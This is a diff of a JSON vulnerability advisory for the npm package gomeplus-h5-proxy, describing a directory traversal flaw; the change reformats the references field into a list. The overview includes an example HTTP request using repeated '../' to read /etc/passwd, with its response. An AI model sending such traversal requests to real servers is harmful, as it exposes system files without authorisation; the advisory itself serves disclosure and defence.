@@ -11,7 +11,9 @@
   "patched_versions": "<0.0.0",
   "overview": "`gomeplus-h5-proxy` is vulnerable to a directory traversal issue, allowing attackers to access any file in the system by placing '../' in the URL.\n\nExample request:\n```\nGET /../../../../../../../../../../../../../../../etc/passwd HTTP/1.1\nhost: localhost\n```\nand response:\n```\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nDate: Mon, 22 May 2017 21:29:51 GMT\nConnection: keep-alive\nTransfer-Encoding: chunked\n\n{contents of /etc/passwd}\n```",
   "recommendation": "Because there is no fix for this module, we suggest using a different one.",
-  "references": "* [PoC by Liang Gong](https://github.com/JacksonGL/NPM-Vuln-PoC/tree/master/directory-traversal/gomeplus-h5-proxy)",
+  "references": [
+    "https://github.com/JacksonGL/NPM-Vuln-PoC/tree/master/directory-traversal/gomeplus-h5-proxy)"
+  ],
   "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
   "cvss_score": 7.5,
   "coordinating_vendor": "^Lift Security"
